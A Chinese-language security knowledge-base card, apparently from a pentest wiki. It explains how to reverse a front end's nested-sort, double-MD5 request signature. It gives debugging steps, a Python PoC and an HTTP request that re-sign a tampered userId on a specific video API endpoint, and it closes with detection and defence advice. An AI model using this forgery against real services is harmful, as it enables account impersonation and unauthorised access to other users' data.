---
id: web-generic-auth-nested-md5-sign-reverse-forgery
title: 嵌套参数排序序列化 + md5(base) 二次哈希的 sign 复现
type: scenario
domain: web
path: web/generic/auth
technique: nested-md5-sign-reverse
tags:
- web
- auth
- api
- signature
- md5
- js-reverse
- nested-serialization
- python
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V15
  verified_at: '2026-11-05T01:50:43+08:00'
  notes: 已对照原文与全部38张图核对：图17 S(B,e) 对 base 生成排序串并 MD5；图28 e=md5(base)；图30 S(fullBody, md5(base)) 的 t=base=...&param=...；图37 Python 输出与图38 返回“成功”证明重算 sign 可用。原文一句式 sign=md5(str(param)+md5(base)) 与断点/Python 输出不一致，卡片采用完整形式并已注明。原文未声明组件/版本。未在本机执行 PoC；frontmatter 无 sources/source_url。
url: /docs/web/generic/auth/web-generic-auth-nested-md5-sign-reverse-forgery/
draft: false
kb_aliases:
- sign JS 逆向
- 嵌套 md5 签名
- base md5 拼接
- 参数排序签名复现
- userid 篡改重签
---

## 一句话结论

前端 `sign` 完全由公开字段计算：先把 `base`/`param` 嵌套对象按键名递归排序序列化成 `k=v&...`，取 `md5(base_str)` 作为盐追加到整个序列化串后再次 MD5；没有服务端密钥，逆向出 `E()` 序列化规则后即可在 Python 中为任意篡改后的 `userId`/参数重算合法 sign。

## 原理

- 请求体形如 `{"param":{...},"base":{"appid","sid","channelId","userId","osid"}}`，其中 `userId` 取自 Cookie `uid`，`sid` 是前端生成的 UUID，`appid`/`channelId` 是固定业务值。
- 前端序列化函数 `E(obj)` 的规则：
  - 对象：取 `Object.keys(obj).sort()`，逐个 key 生成 `key=value`，用 `&` 连接；
  - 嵌套对象：递归得到子串后整体作为 `key=<子串>`，例如 `base=appid=...&channelId=...&osid=0&sid=...&userId=...`；
  - 数组：元素映射后逗号连接；
  - 空值/空数组/空对象：过滤掉，不参与拼接。
- 签名函数 `S(B, e)`：`t = E(B)`；若 `e` 非空则 `t += e`；返回 `MD5(t)`。
- 实际调用是两段：
  1. `md5(base_str) = S(base, "")`；
  2. `sign = S(fullBody, md5(base_str)) = MD5( E(fullBody) + md5(base_str) )`。
- `E(fullBody)` 因为顶层 key 排序为 `base`、`param`，结果形如：
  `base=appid=xfpy&channelId=40000001&osid=0&sid=<uuid>&userId=<uid>&param=needCount=1&pageIndex=1&pageSize=30&worksName=666`
  再把 `md5(base_str)` 直接拼到末尾做第二次 MD5。
- 整条链路没有任何 secret/HMAC：所有输入都能从请求体、Cookie 和前端 JS 得到，因此签名只相当于“格式校验 + 参数完整性校验”，攻击者可任意重算。服务端若还用客户端传来的 `base.userId` 做身份判断，修改 `uid` 即可越权（原文通过改 `userid` 验证）。
- 混淆的 JS 会阻止关键字搜索，但通过 Chrome DevTools 的 Initiator 调用栈定位请求封装，再在 `E`/`S` 处下断点、观察入参与返回值，即可还原；输出长度 32 位 hex 可直接判定 MD5。

## 触发条件

- 请求带 `sign` 字段，且服务端按同一套前端算法校验；先确认签名确实生效（错误 sign 会被拒绝）。
- 前端 JS 可调试（混淆但非不可读），能从 Initiator 断到签名函数。
- 签名只使用请求中可见字段，无服务端密钥、无时间戳/nonce 绑定，或即使有也可由客户端生成。
- `base.userId` 等身份字段来自客户端 Cookie/请求体，服务端未强制用会话身份覆盖。
- 攻击者持有可访问接口的会话/Token。

## 利用步骤

1. 抓取目标请求，确认 `sign` 字段与响应中的“认证失败/成功”差异。
2. 在 DevTools 的 Network → Initiator 中定位发起请求的调用栈，进入请求封装函数。
3. 在请求封装处下断点，观察传入的 `url`、`data`、`param`、`base`；继续单步进入 `E()` 与 `S()`。
4. 记录序列化规则（key 排序、嵌套展开、空值过滤、数组逗号连接）与两次 MD5 的顺序。
5. 用 Python 复刻 `E()` 与 `S()`，先用原请求验证算出的 sign 与抓包一致。
6. 修改 `userId` 或业务参数，重算 `md5(base_str)` 与最终 sign，替换后发送；观察是否从“认证失败”变为“成功”。

## PoC

```python
import hashlib, json

def is_empty(v):
    return v is None or (isinstance(v, (str, list, dict)) and len(v) == 0)

def E(obj):
    if isinstance(obj, dict):
        items = sorted(((k, v) for k, v in obj.items() if not is_empty(v)),
                       key=lambda kv: kv[0])
        return "&".join(f"{k}={E(v)}" for k, v in items)
    if isinstance(obj, list):
        return ",".join(E(x) for x in obj)
    return str(obj)

def md5(s):
    return hashlib.md5(s.encode("utf-8")).hexdigest()

def make_sign(body):
    base_str = E(body["base"])
    param_str = E(body["param"])
    full_str = f"base={base_str}&param={param_str}"  # 等价于 E(fullBody)
    return md5(full_str + md5(base_str))

body = {
    "param": {"needCount": 1, "pageIndex": 1, "pageSize": 30, "worksName": "666"},
    "base": {"appid": "xfpy", "sid": "<uuid>", "channelId": "40000001",
             "userId": "240629152830277692", "osid": 0},
}
body["base"]["userId"] = "2"   # 篡改身份
print(make_sign(body))
```

请求示例：

```http
POST /video-api/synth/qry_works_synth_list HTTP/1.1
Host: target
Content-Type: application/json
Cookie: uid=2; ...
Sign: <重算值>

{"param":{"needCount":1,"pageIndex":1,"pageSize":30,"worksName":"666"},"base":{"appid":"xfpy","sid":"<uuid>","channelId":"40000001","userId":"2","osid":0}}
```

说明：原文最终归纳为 `sign = md5(str(param)+md5(base))`，但调试断点与 Python 输出显示 `E(fullBody)` 实际是 `base=...&param=...` 再追加 `md5(base)`；本卡采用可复现的完整形式。若目标只对 `param` 部分签名，去掉 `base=` 前缀即可，需以断点结果为准。

## 变体与关联

- 序列化变体：顶层/嵌套 key 排序方向、空值过滤、数组逗号连接、是否 URL 编码；必须以断点观察到的实际字符串为准，不能凭直觉拼。
- 签名结构变体：`md5(E(body)+salt)`、`md5(E(base))` 作为盐、双重 MD5、SHA1/SHA256；输出长度可辅助判断。
- 身份变体：`userId` 来自 Cookie、Header 或 body；若服务端不与会话绑定，篡改后可越权。
- 关联：[[web-generic-auth-js-signature-jsrpc-autodecoder]]（前端 MD5 签名 + JSRPC 运行时代签，适合混淆严重的场景）；[[web-generic-auth-api-signature-validation-differential-test]]（先确认签名是否真的校验）；[[web-generic-auth-client-nonce-weak-sha1-signature-forgery]]（无密钥签名的另一实例）。
- 边界：服务端使用独占密钥 HMAC、签名覆盖时间戳/nonce 且服务端校验、身份取自服务端会话而非客户端字段时，本手法不能直接越权。

## 检测与防御

- 检测：同一账号大量请求的 `sign` 由脚本重算、`userId` 与 Cookie/Session 不一致；请求频率与参数分布异常；前端 JS 中出现 `sign`、`md5`、`base`、`userId` 拼接逻辑。
- 防御：签名改为服务端密钥 HMAC-SHA256，覆盖 method、path、query、body hash、timestamp、nonce；密钥不下发前端；`userId` 等身份字段由服务端会话派生，禁止客户端覆盖；增加 nonce/时间窗与重放缓存；常量时间比较；对签名失败与身份不一致告警。
